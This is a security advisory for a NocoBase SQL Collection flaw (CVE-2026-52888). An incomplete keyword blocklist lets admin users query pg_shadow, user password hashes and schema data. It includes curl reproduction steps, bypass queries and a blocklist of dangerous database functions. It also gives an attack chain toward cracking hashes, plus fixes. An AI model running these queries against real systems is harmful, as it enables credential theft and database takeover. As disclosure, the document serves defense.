# [M] NocoBase: Sensitive Data Exposure via SQL Blacklist Bypass

## Summary
Severity: Medium
Advisory: GHSA-v8vm-cqh8-q87q
CVE: CVE-2026-52888
CWE: CWE-184, CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-v8vm-cqh8-q87q
Type: github-advisory

## Affected
- npm: `@nocobase/plugin-collection-sql` — affected >=0 <2.0.62
- npm: `@nocobase/plugin-collection-sql` — affected >=2.1.0-alpha.1 <2.1.0-alpha.46
- npm: `@nocobase/plugin-collection-sql` — affected >=2.1.0-beta.1 <2.1.0-beta.45

## Details
# Security Vulnerability Report: Sensitive Data Exposure via SQL Blacklist Bypass

## Summary

The `checkSQL()` function in `plugin-collection-sql` implements a **keyword-based blacklist** to prevent dangerous SQL queries from being executed through the SQL Collection feature. However, the blacklist is **incomplete**: it only checks for a subset of dangerous PostgreSQL system functions and **does not restrict access to sensitive system catalog tables** such as `pg_shadow`, `pg_roles`, or `pg_stat_activity`.

An authenticated user with the `admin` role can exploit this to **dump PostgreSQL password hashes** (`pg_shadow`), **read all NocoBase user credentials** (hashed passwords from the `users` table), and **enumerate the full database schema** — all data that admin users should never be able to access through the application interface.

---

## Affected Component

**File**: `packages/plugins/@nocobase/plugin-collection-sql/src/server/utils.ts`

```typescript
export const checkSQL = (sql: string) => {
  const dangerKeywords = [
    // PostgreSQL — BLOCKED
    'pg_read_file',
    'pg_read_binary_file',
    'pg_stat_file',
    'pg_ls_dir',
    'pg_logdir_ls',
    'pg_terminate_backend',
    'pg_cancel_backend',
    'current_setting',
    'set_config',
    'pg_reload_conf',
    'pg_sleep',
    'generate_series',

    // MySQL — BLOCKED
    'LOAD_FILE',
    'BENCHMARK',
    '@@global.',
    '@@session.',

    // SQLite — BLOCKED
    'sqlite3_load_extension',
    'load_extension',
  ];

  // NOT BLOCKED: pg_shadow, pg_roles, pg_stat_activity,
  //                 information_schema, users table direct access, etc.

  sql = sql.trim().split(';').shift();
  if (!/^select/i.test(sql) && !/^with([\s\S]+)select([\s\S]+)/i.test(sql)) {
    throw new Error('Only supports SELECT statements or WITH clauses');
  }
  if (dangerKeywords.some((keyword) => sql.toLowerCase().includes(keyword.toLowerCase()))) {
    throw new Error('SQL statements contain dangerous keywords');
  }
};
```

The `execute` action in `sql.ts` passes user-supplied SQL directly through this insufficient check:

```typescript
// sql.ts — execute action
execute: async (ctx: Context, next: Next) => {
  const { sql } = ctx.action.params.values || {};
  try {
    checkSQL(sql);         // ← insufficient validation
  } catch (e) {
    ctx.throw(400, ctx.t(e.message));
  }
  // SQL is executed directly against the database
  const data = await model.findAll({ attributes: ['*'], limit: 5, raw: true });
  ctx.body = { data, fields, sources };
}
```

---

## Root Cause

The blacklist approach is **fundamentally incomplete**. It attempts to enumerate every dangerous construct but misses entire categories:

1. **PostgreSQL system catalog tables** — `pg_shadow`, `pg_authid`, `pg_roles`, `pg_stat_activity` are not restricted
2. **Application-level sensitive tables** — `users` (containing hashed passwords) can be queried directly
3. **`information_schema`** — full schema enumeration is possible
4. **Schema-qualified variants** — even some blocked functions could be bypassed via `pg_catalog.` prefix (e.g. `pg_catalog.pg_read_file` may bypass checks in older versions)

The correct approach is an **allowlist** (whitelist) of permitted tables/schemas, not a blacklist of forbidden keywords.

---

## Steps to Reproduce

**Prerequisites**: A user account with the `admin` role (has the `pm.data-source-manager.collection-sql` ACL snippet).

**Step 1**: Authenticate and obtain a token:
```bash
TOKEN=$(curl -s -X POST http://<TARGET>/api/auth:signIn \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"<password>"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['token'])")
```

**Step 2**: Dump PostgreSQL password hashes from `pg_shadow`:
```bash
curl -s -X POST http://<TARGET>/api/sqlCollection:execute \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sql":"SELECT usename, passwd FROM pg_shadow LIMIT 10"}'
```

**Response**:
```json
{
  "data": {
    "data": [
      {
        "usename": "nocobase",
        "passwd": "SCRAM-SHA-256$4096:wmmGvfjPHRDsnzjOfHCmUQ==$fAXKBU7y3Ymmgg0iq6ibc66fN+v3Q7FaX86RgxP0tTY=:enn2dRiXhUQ2N5o4bRtZLNB3B8FpAdKC8Cp3HZ/hSFU="
      }
    ]
  }
}
```

**Step 3**: Dump NocoBase user credentials:
```bash
curl -s -X POST http://<TARGET>/api/sqlCollection:execute \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"sql":"SELECT id, email, username, password FROM users LIMIT 100"}'
```

**Response** (verified):
```json
{
  "data": {
    "data": [
      {
        "id": 1,
        "email": "admin@nocobase.com",
        "username": "nocobase",
        "password": "1afc4721f320c4e097ac4aaca33544e7dadcc8cd7d57d40240f987bdbcbc686b"
      }
    ]
  }
}
```

---

## Additional Verified Bypass Queries

| Query | Blocked? | Data Exposed |
|-------|----------|--------------|
| `SELECT usename, passwd FROM pg_shadow` |**Not blocked** | PostgreSQL DB user password hashes |
| `SELECT id, email, password FROM users` |**Not blocked** | All NocoBase user credential hashes |
| `SELECT table_name FROM information_schema.tables` |**Not blocked** | Full database schema enumeration |
| `SELECT rolname, rolsuper FROM pg_roles` |**Not blocked** | All DB roles and superuser flags |
| `SELECT pid, query FROM pg_stat_activity` |**Not blocked** | Live SQL queries from all sessions |
| `SELECT pg_read_file('/etc/passwd')` |Blocked | — |
| `SELECT current_setting('app.key')` |Blocked | — |

---

## Why Admin-Required Still Matters

This vulnerability is rated **High** despite requiring admin-level authentication. The reasoning:

### 1. Security Boundary Violation (Scope Changed → S:C)
The `admin` role in NocoBase is an **application-level** role — it manages workflows, collections, and UI. It is **not** a database administrator. Accessing `pg_shadow` is a **PostgreSQL system-level** privilege that admins should never have. The `checkSQL()` function was explicitly created to enforce this boundary; bypassing it breaks the intended security model.

### 2. Data That Admin Cannot Access Through Normal UI
Even with admin privileges, NocoBase's UI and API **do not expose**:
- `pg_shadow` (PostgreSQL internal password store)
- Raw `users.password` hashes via standard API responses
- Full `information_schema` enumeration

VUL-2 grants access to all of the above — data the application explicitly chose not to expose.

### 3. Enables Lateral Movement
The `pg_shadow` SCRAM-SHA-256 hashes can be subjected to offline dictionary attacks. If cracked, the attacker gains **direct PostgreSQL access** with the application's DB credentials — bypassing the NocoBase application layer entirely. This enables reading **all data** in the database (not just what NocoBase exposes), modifying records directly, and accessing data from other schemas.

### 4. Enables Full Attack Chain When Combined with Other Vulnerabilities
```
Member user (lowest privilege)
  → VUL-8: Trigger a pre-built RCE workflow (any logged-in user can trigger)
  → VUL-1: RCE reads APP_KEY from process.env
  → Forge JWT with admin role
  → VUL-2: Dump pg_shadow + users.password
  → Crack hashes → full PostgreSQL access
```

---

## Impacted API Endpoint

```
POST /api/sqlCollection:execute
```

- **Authentication**: Required (`admin` role)
- **ACL Snippet** registered in `plugin.ts`:
  ```typescript
  this.app.acl.registerSnippet({
    name: `pm.data-source-manager.collection-sql`,
    actions: ['sqlCollection:*'],   // includes :execute
  });
  ```
- The `admin` role includes this snippet by default.

---

## Recommended Fixes

### Fix 1 (Immediate): Extend the blacklist with system catalog tables
```typescript
const dangerKeywords = [
  // ... existing entries ...

  // ADD: PostgreSQL system catalog tables with sensitive data
  'pg_shadow',
  'pg_authid',
  'pg_auth_members',
  'pg_stat_activity',
  'pg_roles',
  // Note: information_schema should also be restricted for non-DBA roles
];
```

### Fix 2 (Recommended): Replace blacklist with schema allowlist
Instead of blocking dangerous keywords, only allow queries against **user-defined collection tables**:

```typescript
// Allowlist approach: extract table names from AST and verify against known collections
const allowedTables = await db.getCollectionNames(); // tables created by NocoBase users
const referencedTables = extractTableNames(parsedSQL);
if (!referencedTables.every(t => allowedTables.includes(t))) {
  throw new Error('Query references tables outside the allowed scope');
}
```

### Fix 3 (Defense-in-depth): Use a read-only, restricted DB user
The application's DB connection should use a PostgreSQL user that:
- Does **not** have `SELECT` privilege on `pg_shadow` or `pg_authid`
- Only has access to the application's own schema (`nocobase` schema)

This ensures that even if the blacklist is bypassed, the DB user cannot access system catalogs.

---

## Environment

| Field | Value |
|-------|-------|
| NocoBase version | 2.0.59-full |
| Database | PostgreSQL 16.14 |
| Deployment | Docker (`nocobase/nocobase:2.0.59-full`) |
| Vulnerable file | `plugin-collection-sql/src/server/utils.ts` — `checkSQL()` |
| Vulnerable endpoint | `POST /api/sqlCollection:execute` |
| Auth required | Admin role (`pm.data-source-manager.collection-sql` snippet) |

---

## Timeline

| Date | Event |
|------|-------|
| 2026-05-29 | Vulnerability discovered via whitebox source code audit of `utils.ts` |
| 2026-05-29 | Exploit verified on live Docker instance — `pg_shadow` and `users.password` dumped |
| 2026-05-29 | Report submitted to maintainers |

---
## Script and video PoC:
[poc_vul2_sqli.py](https://github.com/user-attachments/files/28380402/poc_vul2_sqli.py)

https://github.com/user-attachments/assets/6e4e7a3d-e005-4ff8-ab9a-e44ae1365732

## References
- https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q
- https://nvd.nist.gov/vuln/detail/CVE-2026-52888
- https://github.com/nocobase/nocobase/pull/9683
- https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45
- https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4
- https://github.com/nocobase/nocobase
- https://github.com/nocobase/nocobase/releases/tag/v2.0.62
- https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46
